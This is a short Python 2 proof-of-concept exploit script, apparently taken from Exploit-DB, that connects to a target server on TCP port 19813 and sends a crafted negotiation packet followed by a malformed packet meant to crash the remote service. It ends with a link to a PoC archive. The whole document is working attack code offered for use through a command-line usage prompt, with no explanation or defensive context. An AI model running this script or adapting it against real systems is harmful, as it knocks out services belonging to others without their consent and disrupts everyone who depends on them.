#!/usr/bin/python

import socket,struct,sys,os

SIGN=0x04030201
cmd=0x01000000

def main():
	if len(sys.argv)!=2:
		print"\n[x] Usage: python "+sys.argv[0]+" < ip_server >\n"
		sys.exit(0)
	
	else:
		host=sys.argv[1],19813	#default port TCP/19813

	if sys.platform=="win32":
	    os.system("cls")
	else:
	    os.system("clear")
	
	s=socket.socket()
	try:
		s.connect(host)
		s.recv(1024)
	except:
		print"[x] Error connecting to remote host! This is g00d :D."
		sys.exit(0)
	print"[+] Building crafted packets..."
	#packet negotiation request
	pktnego=struct.pack(">L",cmd+0x1)		#+0
	pktnego+=struct.pack("<L",0x00000000)		#+4
	pktnego+=struct.pack("<L",SIGN)			#+8 (signature)
	#packet crash
	pkt1=struct.pack("<L",cmd+0x2)
	pkt1+=struct.pack(">L",0x00000001)		# != 0x0
	pkt1+=struct.pack("<L",SIGN)
	#end	
	print"[+] Negotiation."
	s.send(pktnego)
	s.recv(1024)
	s.send(pkt1)#crash!
	s.close()

if __name__=="__main__":
	main()
#PoC: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15214.zip